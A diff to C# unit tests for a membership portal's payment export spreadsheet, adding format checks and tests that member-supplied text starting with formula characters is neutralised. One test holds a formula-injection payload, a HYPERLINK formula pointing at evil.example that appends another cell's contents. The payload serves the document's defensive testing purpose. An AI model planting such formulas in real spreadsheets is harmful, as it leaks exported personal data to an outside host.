@@ -7,8 +7,8 @@ namespace PSMPE.Portal.Application.UnitTests.Payments;
 public class PaymentExportWorkbookTests
 {
     private static PaymentExportRow Row(
-        string fullName = "Juan Dela Cruz", string? mobile = "09170000001", ProofPicture? picture = null, string? note = "No proof on file") =>
-        new(fullName, "juan@example.com", "12 Sample St., Sample City", mobile, 1700m, "REF-1",
+        string fullName = "Juan Dela Cruz", string? mobile = "09170000001", ProofPicture? picture = null, string? note = "No proof on file", string reference = "REF-1") =>
+        new(fullName, "juan@example.com", "12 Sample St., Sample City", mobile, 1700m, reference,
             new DateOnly(2026, 8, 29), picture, note, "New membership");
 
     private static IXLWorksheet Open(params PaymentExportRow[] rows) =>
@@ -40,6 +40,8 @@ public class PaymentExportWorkbookTests
         Assert.Equal(XLDataType.DateTime, sheet.Cell(2, 7).DataType);
         Assert.Equal(new DateTime(2026, 8, 29), sheet.Cell(2, 7).GetDateTime());
         Assert.Equal("New membership", sheet.Cell(2, 9).GetString());
+        Assert.Contains("₱", sheet.Cell(2, 5).Style.NumberFormat.Format);
+        Assert.Equal("mm/dd/yyyy", sheet.Cell(2, 7).Style.NumberFormat.Format);
     }
 
     [Theory]
@@ -53,14 +55,46 @@ public class PaymentExportWorkbookTests
         Assert.Equal(mobile, cell.GetString());
     }
 
-    [Fact]
-    public void Build_NeverTurnsMemberTextIntoAFormula()
+    [Theory]
+    [InlineData("=1+1")]
+    [InlineData("+1+1")]
+    [InlineData("-1+1")]
+    [InlineData("@SUM(A1)")]
+    public void Build_NeverTurnsMemberTextIntoAFormula(string value)
     {
-        var cell = Open(Row(fullName: "=1+1")).Cell(2, 1);
+        var cell = Open(Row(fullName: value)).Cell(2, 1);
 
         Assert.False(cell.HasFormula);
-        Assert.Equal("=1+1", cell.GetString());
+        Assert.Equal("'" + value, cell.GetString());
     }
+
+    [Fact]
+    public void Build_NeutralisesFormulasInTheReferenceColumn()
+    {
+        const string evil = "=HYPERLINK(\"http://evil.example/?\"&A3,\"Open\")";
+
+        var cell = Open(Row(reference: evil)).Cell(2, 6);
+
+        Assert.False(cell.HasFormula);
+        Assert.Equal("'" + evil, cell.GetString());
+    }
+
+    [Fact]
+    public void Build_LeavesASingleCharacterReferenceAlone()
+    {
+        Assert.Equal("-", Open(Row(reference: "-")).Cell(2, 6).GetString());
+    }
+
+    [Fact]
+    public void Build_EmbedsAVeryThinPictureWithNonZeroHeight()
+    {
+        var picture = new ProofPicture(ProofFixtures.Jpeg(1000, 6), 1000, 6);
+
+        var sheet = Open(Row(picture: picture, note: null));
+
+        Assert.True(Assert.Single(sheet.Pictures).Height > 0);
+    }
+
 
     [Fact]
     public void Build_EmbedsPictureInTheProofColumnOfItsRow()
